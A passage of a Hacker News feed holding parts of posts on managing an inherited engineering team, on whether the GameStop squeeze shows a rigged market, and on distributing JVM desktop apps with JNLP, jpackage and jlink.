solve them.&nbsp;</p><h2><strong>Learn the existing team‚Äôs domain to follow conversations</strong></h2><p>At the start, you‚Äôre going to struggle to keep up with the team‚Äôs conversations. You must put in the time to learn the jargon and the systems that the team works in. You aren‚Äôt expected to become the foremost expert of the team‚Äôs codebases. Yet you must understand enough so you can empathize with the team. The goal is understanding since you will be an important advocate for these people.</p><p>Again, asking questions will be your quickest path to success. When in one on ones, if a report begins to talk about what they‚Äôre working on, dig deeper than normal. Don‚Äôt assume too much. Embrace your naivety.</p><p>Examples of questions to ask are:&nbsp;</p><ul><li>Why was the code implemented this way?&nbsp;</li><li>What was the original purpose of it?&nbsp;</li><li>What challenges exist when working with this code?</li><li>How did the team decide to use that specific library?</li><li>How does this code fit into the architecture of the application?</li></ul><p>You‚Äôll also need to do homework on your own to learn what the team works with. Beyond the languages, identify the application‚Äôs key frameworks, systems, and libraries. Ask the team for blog posts, design documents, and book recommendations. This information will provide you with the context you need to finally keep up with the team.</p><h2><strong>Embrace Your Diverse Experience</strong></h2><p>You are going to learn a lot from the team ‚Äì new technologies, jargon, systems, and more. This does not mean your experience is meaningless though.</p><p>There will be times where the team struggles with a problem because they think an imaginary constraint exists. I‚Äôve seen this before ‚Äì a client-focused team has had a history of problems working with a backend team. Things like adding a new API is assumed to take a high amount of effort.</p><p>This is where you can help with your backend experience. You can provide them insight into how the backend systems work.</p><p>Remember that your experience here is not about imposing your will. Instead, continue to focus on questions to identify assumptions. Once you discover these, you can start to add real value.</p><h2><strong>Conclusion</strong></h2><p>Becoming the manager of a new team is daunting no matter the situation. Particularly when the team works in a domain you have zero experience with. To succeed in this environment, you need to enter it from a place of curiosity. Ask a lot of questions, learn how the team does its work, and partner with influential team members. By taking these steps, you will discover the problems that are holding the team back.</p><p>With these problems in your mind, you can start to support the team in achieving their goals.</p><h3>How do you gain the trust of an existing team?</h3><p>I‚Äôd love to learn any tips you have to gain the trust of an existing team. The challenge of leading a group with strong relationships is daunting. How have you done it?</p><p>Let me know on&nbsp;<a href="https://twitter.com/ternarywat/status/1360804780927574016" target="_blank" rel="noreferrer noopener">Twitter</a>&nbsp;or&nbsp;<a href="https://www.linkedin.com/feed/update/urn:li:activity:6766571093806465024/" target="_blank" rel="noreferrer noopener">LinkedIn</a>.</p> <h3>Further Reading</h3><ul><li><a href="https://bookshop.org/a/22141/9781422188613" target="_blank" rel="noreferrer noopener sponsored nofollow">The First 90 Days: Proven Strategies for Getting Up to Speed Faster and Smarter</a></li></ul></div><!-- .entry-content --><!-- .entry-footer --></article><!-- #post-${ID} --><nav role="navigation" aria-label="Posts"><h2>Post navigation</h2></nav></main><!-- #main --></section><!-- #primary --></div></div>]]>
            </description>
            <link>https://buildthestage.com/how-to-manage-existing-engineering-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135955</guid>
            <pubDate>Sun, 14 Feb 2021 20:29:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: 19-Year-Old If Game Restored Using TeaVM]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26135892">thread link</a>) | @TeaVMFan
<br/>
February 14, 2021 | https://frequal.com/ifml | <a href="https://web.archive.org/web/*/https://frequal.com/ifml">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://frequal.com/ifml</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135892</guid>
            <pubDate>Sun, 14 Feb 2021 20:23:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does GameStop Prove the Stock Market Is Rigged?]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26135842">thread link</a>) | @amoorthy
<br/>
February 14, 2021 | https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged | <a href="https://web.archive.org/web/*/https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>


<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Just weeks ago, the share price for GameStop, a brick-and-mortar retailer of video games, saw its shares go from $17 to $483 before plummeting back down to <a href="https://www.marketwatch.com/investing/stock/gme"><span>around $50</span></a> within the span of a month. The story gripped the media (the subject of more than 3,000 articles) and the public's attention, painted as a <a href="https://www.cnbc.com/2021/01/27/gamestop-mania-explained-how-the-reddit-retail-trading-crowd-ran-over-wall-street-pros.html"><span>David vs. Goliath</span></a> story: small, plucky retail investors (non-professional individual investors) were taking on institutional investors (billion dollar firms, such as hedge funds, that invest with pooled resources) ‚Äî and supposedly <a href="https://markets.businessinsider.com/news/stocks/reddit-day-traders-investors-conflict-with-wall-street-hedge-funds-2021-1-1030016712"><span>winning big</span></a>. The soaring stock price finally crashed when popular trading platforms like Robinhood limited stock trading, coincidentally providing a way out for institutional investors who had been betting on the stock going down.</p>
<!--more-->
<p>Now, accusations are flying from both sides. Retail investors worry about collusion between Wall Street and trading platforms, whose decision to limit trading effectively put an end to the <a href="https://www.kiplinger.com/investing/602165/what-exactly-is-a-short-squeeze"><span>short squeeze</span></a> that big funds were trapped in. Meanwhile, Wall Street has lodged complaints about market manipulation that cost them billions. So, what really happened? Does the incident stand up to its underdog narrative or is it evidence that the stock market unfairly benefits Wall Street firms over everyday Americans? This week, The Factual looked at <a href="https://docs.google.com/spreadsheets/d/1CfG95Z047Dn-Q8Yip-JZxhdC0K7iKb4PAWLAD0Lanek/edit?usp=sharing"><span>highly rated news articles</span></a> from 20 sources across the political spectrum to find some answers.</p>
<blockquote>
<p><strong>What is shorting?</strong> Shorting is when an investor bets against a stock rising in the future. During a short, an investor ‚Äúborrows‚Äù shares of a specific stock and immediately sells them with the intention of buying the same number of shares back at a later date, for a lower price, before returning them to the original owner. If the stock depreciates over that period, the borrower gets to pocket the difference between the initial selling price and the later purchasing price. However, if the stock price increases, the borrower ends up losing money since they have to repurchase shares at a higher price before returning them. In January, institutional investors were shorting GME on a huge scale, and retail investors were purchasing GME shares to raise and keep the price high.</p>
<p><strong>What is a short squeeze? </strong>A short squeeze can happen when those shorting a stock are forced to repurchase shares at a higher price due to market movements. This repurchasing at higher prices can cause the stock‚Äôs price to climb even higher. In the case of GME, the activity of retail investors forced the large firms shorting the stock to repurchase shares at huge losses.&nbsp;</p>
</blockquote>
<p><strong>GameStop (GME) Share Price and Volume</strong></p>
<p><img src="https://lh6.googleusercontent.com/ZWC6lPja-6dOewgImUCpOa6l0STcuw3JPuGVsvLeqV0u0vhQ7IaILo1X0y4qTg0ktvE9qJLpoyp8yzon3DAE_amlIBi9HMP6kLYRpD6hlUVLrsm6xAcxfo7nmqdDPgb8Z71h3sPk" width="823"></p>

<h4><strong>Was There Foul Play?</strong></h4>
<div><p>As a social media-driven frenzy of buying drove the price of GME ever-higher on the week of January 25, the investment rationale for <a href="https://theconversation.com/wallstreetbets-is-disrupting-financial-markets-possibly-permanently-154355"><span>vigilante small investors</span></a>, largely associated with the online Reddit forum <a href="https://www.reddit.com/r/wallstreetbets/"><span>r/WallStreetBets</span></a>, was clear: buy and hold. Widespread purchasing of GME would generate returns for those buying in, often at the expense of big investors. These big investors who had shorted the stock were thus forced to buy even more shares ‚Äî raising the price still higher ‚Äî or risk facing even greater losses. Then things changed. Retail investors found themselves unable to continue purchasing shares as platforms like Robinhood and Webull limited buys, citing <a href="https://www.cnet.com/personal-finance/robinhood-backlash-heres-what-you-should-know-about-the-gamestop-stock-controversy/"><span>heightened capital requirements</span></a> due to the unprecedented increase in investments. This seemingly permitted large institutional investors to stop the bleeding and close positions before more damage was done.&nbsp;</p></div>
<p><img src="https://lh5.googleusercontent.com/JymbmnVOvmovmwpWZuM5b7qJUB2jBUdkbmPoAJTeDAWTNyb-vsW6dBfUui3m13iOlmWhqSDy0ANC1R4u39fYwTqz40UQskNB1k5DDgYvxHedNaO4aMvjIUvWO23sDZVq61fJI4jZ" width="478" height="299"><br>Source: <a href="https://twitter.com/RobinhoodApp/status/1354805613566410756?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1354805613566410756%7Ctwgr%5E%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.cnet.com%2Fpersonal-finance%2Frobinhood-backlash-heres-what-you-should-know-about-the-gamestop-stock-controversy%2F"><span>Twitter</span></a></p>
<p>This turn of events immediately drew ire from those concerned with the potential for foul play, including diametrically opposed <a href="https://www.nbcnews.com/politics/politics-news/gamestop-story-isn-t-populist-fairy-tale-n1256623"><span>political figures</span></a> like Democratic Representative Alexandria Ocasio-Cortez and Republican Senator Ted Cruz. However, many now accept the capital requirements as a plausible <a href="https://www.washingtonexaminer.com/news/the-gamestop-reddit-story-goes-beyond-us-vs-them"><span>explanation</span></a>, not the result of some orchestrated plot. Firms have to have a certain amount of capital <a href="https://reason.com/2021/02/09/why-wallstreetbets-and-bitcoiners-got-so-excited-about-gamestop/"><span>on hand</span></a> to cover trades, and Robinhood had to take action to cover the exponential increase in trading volume, at one point needing to raise <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><span>$3.4 billion</span></a> to cover new deposits. A forthcoming investigation of what occurred will work to ensure this explanation is valid.&nbsp;</p>
<p>In the meantime, users of such platforms can‚Äôt help but point to <a href="https://www.nbcnews.com/politics/politics-news/gamestop-story-isn-t-populist-fairy-tale-n1256623"><span>reasons for collusion</span></a>. Robinhood <a href="https://www.washingtonpost.com/business/2021/01/29/robinhood-citadel-gamestop-reddit/"><span>directs</span></a> ‚Äúmore than half of its customer orders‚Äù through Citadel Securities, a ‚Äúfinancial-services giant.‚Äù Part of Citadel came to the <a href="https://www.chicagotribune.com/business/ct-biz-gamestop-robinhood-citadel-ken-griffin-20210129-pz3ln7d6wra5rbpno7nb5rgvgm-story.html"><span>rescue of Melvin Capital</span></a> (a major fund which lost as much as $4.5 billion), and its own fund, Citadel Advisors LLC, was likely <a href="https://wallstreetonparade.com/2021/02/citadel-didnt-just-bail-out-a-gamestop-short-seller-citadel-also-had-a-big-short-position-in-gamestop/"><span>trading in GameStop itself</span></a>, according to the latest available financial reporting from September 2020. Both Robinhood and Citadel have pleaded their innocence, but retail investors see a financial system that recoiled and readjusted when common people were reaping huge profits at the expense of powerful, connected firms. (Further accusations, including that Robinhood <a href="https://www.theverge.com/2021/1/28/22254857/robinhood-gamestop-amc-shares-sold-surprised-users#:~:text=No%2C%20Robinhood%20tells%20The%20Verge,without%20permission%20from%20its%20traders.&amp;text=Quite%20a%20number%20of%20Robinhood,down%20a%20dozen%20of%20them"><span>forcibly closed</span></a> some users‚Äô positions in GME and other stocks, appear to be false or misinformed.)</p>
<p>As Wall Street firms were taking big losses, the aggrieved parties decried ‚Äú<a href="https://www.wsj.com/articles/gamestop-mania-reveals-power-shift-on-wall-streetand-the-pros-are-reeling-11611774663"><span>market manipulation</span></a>‚Äù by retail investors ‚Äî effectively suggesting that small-time investors were the ones engaging in foul play. The argument is essentially that these buyers were coordinating in such a way to collectively manipulate the value of specific stocks. Experts have since pointed out that the level of coordination likely does <a href="https://www.marketwatch.com/story/is-gamestop-stock-being-manipulated-by-social-media-users-or-is-it-free-speech-legal-experts-weigh-in-11611636278"><span>not amount</span></a> to a level of legal culpability. The discussions of retail investors more likely fall in a gray area somewhere between organized market manipulation and perfectly legal discussions, captured by non-committal sentiments like ‚Äú<a href="https://www.wsj.com/articles/we-like-the-stock-the-anatomy-of-a-meme-11612542783"><span>we like the stock</span></a>.‚Äù Furthermore, skeptics wonder how hedge funds can take issue with retail investors pursuing a strategy to shift the value of a stock when Wall Street firms regularly <a href="https://prospect.org/power/gamestop-craziness-pulls-back-curtain-on-stock-market/"><span>employ such strategies</span></a> themselves.</p>
<div><p>Another concerning source of potential foul play comes from the ability for anyone to start and fuel trends on social media platforms and forums and then use those public movements to pursue greater profits. Forums like r/WallStreetBets allow experienced and novice investors to <a href="https://www.wsj.com/articles/melvin-capital-lost-53-in-january-hurt-by-gamestop-and-other-bets-11612103117"><span>intermingle anonymously</span></a>, and there is very little clarity about who is feeding information and for what reasons. Some have argued that this leaves the door open to manipulation from large investors, many of whom are known to monitor online forums like r/WallStreetBets, or at the very least unscrupulous individuals seeking to take advantage of uninformed investors. In the last few years, several apps have even emerged that allow institutional investors to <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><span>monitor the trading preferences and discussions</span></a> of retail investors, helping to identify and take advantage of trends. This makes more sinister manipulation a possibility, though nothing has been verified thus far.</p></div>
<h4><strong>The House Always Wins</strong></h4>
<div><p>Focusing too much on accusations of foul play can distract from the essential details of the day. Who, in the end, made money? Forthcoming investigations will clarify who benefited the most, but evidence suggests that many of those who actually profited are likely to be firms like Senvest, who emerged with an eye-watering <a href="https://www.wsj.com/articles/this-hedge-fund-made-700-million-on-gamestop-11612390687"><span>$700 million in profit</span></a> from selling GME, not retail investors. The far more likely scenario is that more small-time investors lost money than made it, all while most big investors were leveraging their range of tools and depth of knowledge to turn a handsome profit.</p></div>
<p><img src="https://lh3.googleusercontent.com/vqTzCimciM3g9y0A5LRYQ_pGaq7zEvrJBNP98-qW5ugf-UEQkJ997ddwtopKVFiNFzl8Umq9YWI7blAbmb8MRfSGW0e5aygXc93F1CNyLoIa0sDaUfXJBIeHUP-6VIt5XrVIcXnx" width="583" height="420"></p>
<div><p>Similar short squeezes occurred with several other stocks, but GME was the most pronounced. Source: <a href="https://www.ft.com/content/04e6c524-389b-47fc-afaa-eb52c1e76048"><span>Financial Times</span></a></p></div>
<p>To begin with, the gradual growth and explosion of GME was driven not just by r/WallStreetBets followers but institutional investors who began investing in GME months ago. Senvest, for example, <a href="https://www.wsj.com/articles/this-hedge-fund-made-700-million-on-gamestop-11612390687"><span>owned 5% of the company</span></a> in October, and according to the <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><em><span>Washington Post</span></em></a>, the ‚Äúfour largest asset managers in the world together own 39 percent of GameStop shares.‚Äù Then, in a <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><span>flurry of activity</span></a> over three days, GME shares ‚Äúchanged hands 554 million times ‚Äî more than 11 times the number of total shares available,‚Äù including hundreds of millions of shares being traded at $200 to $300 a share. This volume of trading belies the perceived financial resources and trading rationale (buy and hold) of retail investors working through places like r/WallStreetBets, and rather suggests the hand of informed, large firms buying and selling huge numbers of shares. Simply put, the trading activity suggests that large firms were equally involved in the subsequent boom and bust as small-time investors, <a href="https://www.theguardian.com/business/2021/feb/03/david-v-goliath-narrative-in-gamestop-story-has-serious-flaws"><span>undermining</span></a> the ‚ÄúDavid vs. Goliath‚Äù narrative.</p>
<p>Thinking about the tools and financial acumen of both sides can tell us a lot about who the actual winners and losers are likely to be. On one side, we have well-informed <a href="https://www.washingtonpost.com/business/2021/02/08/gamestop-wallstreet-wealth/"><span>wealthy firms</span></a> with superior financial acumen, access to and understanding of more sophisticated financial products, and significant trading experience. On the other is a rabble of mostly new investors, enabled by the explosive growth of new trading platforms like Robinhood. These are largely teens and young adults ‚Äî the <a href="https://www.wsj.com/articles/teens-are-gambling-their-savings-on-gamestop-stock-their-parents-are-worried-11612540818"><span>average age</span></a> of users on Robinhood is just 31. A survey cited in <a href="https://www.marketwatch.com/story/losing-money-is-not-a-joke-gamestop-drama-drives-interest-in-financial-literacy-the-most-important-takeaway-of-all-11612880459"><span>MarketWatch</span></a> found ‚Äú44% of 1,600 self-directed investors in GameStop and AMC had less than a year of experience trading and another quarter had up to two year‚Äôs experience.‚Äù The <a href="https://www.vox.com/the-goods/22273192/teen-investors-gamestop-robinhood"><span>combination</span></a> of social media-driven hype, questionable crowd-sourced advice, and limited familiarity with sound investment strategies makes these investors far more likely to lose out, exemplified by users who bought in after GME shares were already worth hundreds of dollars. Robinhood is separately under fire for their <a href="https://www.cnet.com/news/even-before-gamestop-stock-frenzy-robinhood-raised-a-lot-of-red-flags/"><span>gamified trading platform</span></a>, which enables access for new investors but also exposes individuals with no trading experience to financial risk; the company is even facing a <a href="https://www.forbes.com/sites/jeffkauflin/2021/02/08/robinhood-hit-with-wrongful-death-suit-from-the-family-of-alex-kearns-alleging-customer-service-failures-and-reckless-practices/?sh=50fc57eead6d"><span>wrongful death lawsuit</span></a> after a 20-year-old user committed suicide in June 2020, fearing he owed over $700,000.</p>
<div><p>There are endless stories of the ‚Ä¶</p></div></span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged">https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged</a></em></p>]]>
            </description>
            <link>https://blog.thefactual.com/does-gamestop-prove-the-stock-market-is-rigged</link>
            <guid isPermaLink="false">hacker-news-small-sites-26135842</guid>
            <pubDate>Sun, 14 Feb 2021 20:17:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Distribution of JVM Desktop Applications]]>
            </title>
            <description>
<![CDATA[
Score 126 | Comments 90 (<a href="https://news.ycombinator.com/item?id=26135532">thread link</a>) | @nfrankel
<br/>
February 14, 2021 | https://blog.frankel.ch/state-jvm-desktop-frameworks/6/ | <a href="https://web.archive.org/web/*/https://blog.frankel.ch/state-jvm-desktop-frameworks/6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main"> <div> <article itemscope="" itemtype="http://schema.org/BlogPosting"> <meta itemprop="mainEntityOfPage" content="//state-jvm-desktop-frameworks/6/"> <meta itemprop="description" content="">  <figure itemscope="" itemprop="image" itemtype="http://schema.org/ImageObject"> <meta itemprop="url" content="https://blog.frankel.ch/assets/resources/state-jvm-desktop-frameworks/tree-flower-jungle-usa-garden-mailbox-1148044-pxhere.com.jpg"> </figure> <section> <div itemprop="articleBody"> <p>The previous posts of this series focused on different frameworks to develop JVM-based applications.</p> <p>This is the 6<sup>th</sup> post in the The state of JVM desktop frameworks focus series.Other posts include:</p> <ol><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/1/" target="_blank" rel="noopener">The state of JVM desktop frameworks: introduction</a></span></li><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/2/" target="_blank" rel="noopener">The state of JVM desktop frameworks: Swing</a></span></li><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/3/" target="_blank" rel="noopener">The state of JVM desktop frameworks: SWT</a></span></li><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/4/" target="_blank" rel="noopener">The state of JVM desktop frameworks: TornadoFX</a></span></li><li><span><a href="https://blog.frankel.ch/state-jvm-desktop-frameworks/5/" target="_blank" rel="noopener">The state of JVM desktop frameworks: Jetpack Compose for Desktop</a></span></li><li><span><em>Distribution of JVM desktop applications</em> (this post)</span></li></ol> <p>Distributing applications on a couple of computers inside the same company is not an issue. A lot of products are available for automating the pushing of files onto computers. Issues might start to appear when you need to coordinate the deployment across different physical sites.</p> <p>However, the biggest problem is when computers are not known in advance: in that case, it‚Äôs not possible to push. For that reason, two decades ago, we saw a move from client-server architectures to web-based architectures.</p> <p>The remaining question is how to deploy a Java desktop application. In this post, we are going to go through some options to distribute this kind of application.</p> <div> <h2 id="applets">Applets</h2> <div> <p>While not strictly about desktop applications, I believe it‚Äôs a good idea to mention <a href="https://en.wikipedia.org/wiki/Java_applet" target="_blank" rel="noopener">applets</a> in a post about distributing Java apps.</p> <p>Applets were the first way to make Java applications available remotely. The idea was to host on a web server both bytecode (a single class or JAR) and reference it in an HTML page.</p> <div> <p>index.html</p> <div> <pre><code data-lang="html"><span>&lt;!DOCTYPE html&gt;</span>
<span>&lt;html&gt;</span>
  <span>&lt;body&gt;</span>
  <span>&lt;applet</span> <span>code=</span><span>"HelloWorld.class"</span> <span>height=</span><span>"640"</span> <span>width=</span><span>"480"</span><span>&gt;&lt;/applet&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span></code></pre> </div> </div> <p>Note that an applet runs client-side, thus requiring a local <abbr title="Java Runtime Environment">JRE</abbr>. It also mandates a browser plugin. Both are security concerns. That lead browser vendors to remove the support of plugins and in turn the Java team to deprecate applets in Java 9.</p> <div> <blockquote> <p>With modern browser vendors working to restrict or reduce the support of plugins like Flash, Silverlight, and Java in their products, developers of applications that rely on the Java browser plugin need to consider alternative options. Java developers currently relying on browser plugins should consider migrating from Java Applets to the plugin-free Java Web Start technology.</p> <p>Supporting Java in browsers is only possible for as long as browser vendors are committed to supporting standards-based plugins. By late 2015, many browser vendors had either removed or announced timelines for the removal of standards-based plugin support, while some are introducing proprietary browser-specific extension APIs. Consequently, Oracle is planning to deprecate the Java browser plugin in JDK 9.</p> <p>The deprecated plugin technology will be completely removed from the Oracle Java Development Kit (JDK) and Java Runtime Environment (JRE) in a future Java release TBD. Java Web Start applications do not rely on a browser plugin and will not be affected by these changes.</p> </blockquote>  </div> </div> </div> <div> <h2 id="open-web-start">Open Web Start</h2> <div> <p>After applets, the next alternative for distributing Java applications is Java Web Start. This is the canonical way for desktop applications. As a personal note, I used it more than 15 years ago with Java 1.4. This <a href="https://www.oracle.com/java/technologies/javase/jws-archive-download.html" target="_blank" rel="noopener">page</a> seems to confirm JDK 1.4.2 was the first version to provide it natively, as opposed to as a separate download. Yet, Oracle deprecated Java Web Start in JDK 9 and removed it in JDK 11.</p> <p>This left JWS users without any option. <a href="https://karakun.com/" target="_blank" rel="noopener">Karakun</a> is a company that took ownership of the project. It provides it as a separate package under the name <a href="https://openwebstart.com/" target="_blank" rel="noopener">Open Web Start</a> and the software is the same.</p> <p>To distribute an application via Open Web Start, in addition to the JAR itself, you need to provide a <abbr title="Java Network Launching Protocol">JNLP</abbr> file. This file serves as an external deployment descriptor of a sort. Features of JNLP are quite exhaustive:</p> <ul><li><span>Add a shortcut on the user‚Äôs desktop</span></li><li><span>Whether the application can run offline after you‚Äôve downloaded it</span></li><li><span>Update policies</span></li><li><span>Optional list of native libraries</span></li><li><span>etc.</span></li></ul> <p>The complete <a href="https://docs.oracle.com/javase/tutorial/deployment/deploymentInDepth/jnlpFileSyntax.html" target="_blank" rel="noopener">specifications</a> are still available on Oracle‚Äôs site.</p> <p>Let‚Äôs create a JNLP to distribute our sample Swing application:</p> <div> <p>renamer.jnlp</p> <div> <pre><code data-lang="xml"><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span>&lt;jnlp</span> <span>spec=</span><span>"1.0+"</span> <span>codebase=</span><span>""</span> <span>href=</span><span>""</span><span>&gt;</span>
  <span>&lt;information&gt;</span>
    <span>&lt;title&gt;</span>File Renamer<span>&lt;/title&gt;</span>
    <span>&lt;vendor&gt;</span>Nicolas Fr√§nkel<span>&lt;/vendor&gt;</span>
    <span>&lt;offline-allowed/&gt;</span>
  <span>&lt;/information&gt;</span>
  <span>&lt;resources&gt;</span>
    <span>&lt;j2se</span> <span>version=</span><span>"11+"</span> <span>/&gt;</span>
    <span>&lt;jar</span> <span>href=</span><span>"https://path.to/archive.jar"</span>                              <i data-value="1"></i><b>(1)</b>
         <span>main=</span><span>"true"</span> <span>/&gt;</span>                                                  <i data-value="2"></i><b>(2)</b>
  <span>&lt;/resources&gt;</span>
  <span>&lt;security&gt;</span>
    <span>&lt;all-permissions</span> <span>/&gt;</span>                                                  <i data-value="3"></i><b>(3)</b>
  <span>&lt;/security&gt;</span>
  <span>&lt;application-desc</span> <span>name=</span><span>"File Renamer"</span>
                    <span>main-class=</span><span>"ch.frankel.blog.renamer.RenamerAppKt"</span> <span>/&gt;</span> <i data-value="4"></i><b>(4)</b>
  <span>&lt;update</span> <span>check=</span><span>"background"</span><span>/&gt;</span>
<span>&lt;/jnlp&gt;</span></code></pre> </div> </div> <div> <table> <tbody><tr> <td><i data-value="1"></i><b>1</b></td> <td>Path to the JAR</td> </tr> <tr> <td><i data-value="2"></i><b>2</b></td> <td>Flag that marks the JAR as containing the main class</td> </tr> <tr> <td><i data-value="3"></i><b>3</b></td> <td>The Renamer application reads and writes the filesystem, it requires permissions. Note that permission grant is <strong>not</strong> fine-grained. Also, permissions require you to sign the JAR.</td> </tr> <tr> <td><i data-value="4"></i><b>4</b></td> <td>Class that contains the entry-point (the <code>main</code> method)</td> </tr> </tbody></table> </div> </div> </div> <div> <h2 id="jpackage">jpackage</h2> <div> <p>While Open Web Start is not available as part of the JDK anymore, the <a href="https://docs.oracle.com/en/java/javase/14/jpackage/packaging-overview.html" target="_blank" rel="noopener"><code>jpackage</code></a> tool is. It‚Äôs included since JDK 14. As its name implies, <code>jpackage</code> allows you to create a native installer from a JAR.</p> <p>Its basic usage is straightforward:</p> <div> <div> <pre><code data-lang="bash">jpackage <span>--input</span> target <span>--main-jar</span> renamer-swing-1.0.jar    <i data-value="1"></i><b>(1)</b></code></pre> </div> </div> <div> <table> <tbody><tr> <td><i data-value="1"></i><b>1</b></td> <td>Assume a Maven project that generates the JAR in the <code>target</code> subfolder</td> </tr> </tbody></table> </div> <p>On a macOS computer, the above command creates a <code>RenamerAppKt-1.0.dmg</code> installer. It contains a macOS application with the following structure:</p> <p><span><img src="https://blog.frankel.ch/assets/resources/state-jvm-desktop-frameworks/jpackage-app-structure.jpg" alt="Application‚Äôs structure as created by the jpackage" width="236" height="408"></span></p> <p>The structure includes:</p> <ul><li><span>The JAR</span></li><li><span>A JRE - the one associated with the <code>jpackage</code> command that created the installer</span></li><li><span>macOS-specific files</span></li></ul> <p>While the sample JAR is 1.5 MB, the installer is more than 50 MB because of the embedded Java runtime.</p> </div> </div> <div> <h2 id="jlink">jlink</h2> <div> <p><code>jlink</code> is not a real distribution mechanism but I believe it still deserves a mention. It allows you to create a custom runtime with a dedicated launcher script for your applications. It‚Äôs part of the JDK since Java 9.</p> <p>While it can in theory <a href="https://medium.com/azulsystems/using-jlink-to-build-java-runtimes-for-non-modular-applications-9568c5e70ef4" target="_blank" rel="noopener">work with any application</a>, it shines with modularized applications. Such applications need to describe the modules they depend on in a <code>module-info.java</code>.</p> <p>The main task is to modularize the application. For our sample app, the <code>module-info.java</code> file is:</p> <div> <p>module-info.java</p> <div> <pre><code data-lang="java"><span>module</span> <span>filerenamer</span><span>.</span><span>swing</span> <span>{</span>
    <span>requires</span> <span>eventbus</span><span>;</span>                            <i data-value="1"></i><b>(1)</b> <i data-value="2"></i><b>(2)</b>
    <span>requires</span> <span>java</span><span>.</span><span>desktop</span><span>;</span>                        <i data-value="1"></i><b>(1)</b>
    <span>requires</span> <span>kotlin</span><span>.</span><span>stdlib</span><span>;</span>                       <i data-value="1"></i><b>(1)</b>
    <span>exports</span> <span>ch</span><span>.</span><span>frankel</span><span>.</span><span>blog</span><span>.</span><span>renamer</span> <span>to</span> <span>eventbus</span><span>;</span>  <i data-value="3"></i><b>(3)</b>
<span>}</span></code></pre> </div> </div> <div> <table> <tbody><tr> <td><i data-value="1"></i><b>1</b></td> <td>Declare dependent modules</td> </tr> <tr> <td><i data-value="2"></i><b>2</b></td> <td>The Greenrobot library is an unnamed module. We need to reference it via the JAR‚Äôs name.</td> </tr> <tr> <td><i data-value="3"></i><b>3</b></td> <td>Allow Greenrobot to use our classes</td> </tr> </tbody></table> </div> <p>Modularizing one‚Äôs application is pretty straightforward. But to decide whether a JDK module will make it into the final runtime, <code>jlink</code> requires to <strong>transitively analyze every dependency</strong> of the application. Yet, <a href="https://blog.frankel.ch/update-state-java-modularization/" target="_blank" rel="noopener">about 35% of the libraries</a> are neither modularized nor declare an <code>Automatic-Module-Name</code> in their <code>MANIFEST.MF</code>.</p> <p>It‚Äôs possible to add this information during one‚Äôs build even though the procedure is error-prone and boring. The description on how to achieve this deserves a post on its own. For more information, please check <a href="https://blogs.oracle.com/javamagazine/containerizing-apps-with-jlink" target="_blank" rel="noopener">this Oracle magazine article</a>. Suffice to say here that it makes heavy use of the <a href="https://github.com/moditect/moditect" target="_blank" rel="noopener">Moditect Maven plugin</a>.</p> <p>After having <a href="https://github.com/ajavageek/renamer-swing/blob/feature/jlink/pom.xml#L56-L108" target="_blank" rel="noopener">configured the POM</a>, packaging the Renamer Swing application yields a folder that contains a runnable launcher script and the necessary modules from the JDK.</p> <p><span><img src="https://blog.frankel.ch/assets/resources/state-jvm-desktop-frameworks/jlink-output.jpg" alt="Output of jlink" width="184" height="288"></span></p> <p>The folder size is around 86MB. By using <code>gzip</code>, you can reduce the size to about a 30MB archive that you can distribute.</p> <p>Note that it will require users to decompress the archive and to know which script to launch, though.</p> </div> </div> <div> <h2 id="other-candidates">Other candidates</h2> <div> <p>Here are some other candidates that I discovered while researching this post. Note that I have experience with none of them but it might be useful for some of you.</p> <ul><li><span>Oracle introduced <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/deploy/packager.html" target="_blank" rel="noopener"><code>javapackager</code></a> in Java 8. <code>javapackager</code> is the ancestor of <code>jpackage</code> and is now superseded by the latter.</span><div> <blockquote> <p>The Java Packager tool can be used to compile, package, sign, and deploy Java and JavaFX applications from the command line. It can be used as an alternative to an Ant task or building the applications in an IDE.</p> </blockquote> </div></li><li><span><a href="https://github.com/edvin/fxlauncher" target="_blank" rel="noopener">FXLauncher</a> is both a launcher and an auto-updater that focuses solely on JavaFX applications.</span><p>FXLauncher is released under the Apache License 2.0.</p></li><li><span><a href="http://launch4j.sourceforge.net/" target="_blank" rel="noopener">Launch4J</a>:</span></li></ul> <div> <div> <div> <blockquote> <p>Launch4j is a cross-platform tool for wrapping Java applications distributed as jars in lightweight Windows native executables. The executable can be configured to search for a certain JRE version or use a bundled one, and it‚Äôs possible to set runtime options, like the initial/max heap size. The wrapper also provides a better user experience through an application icon, 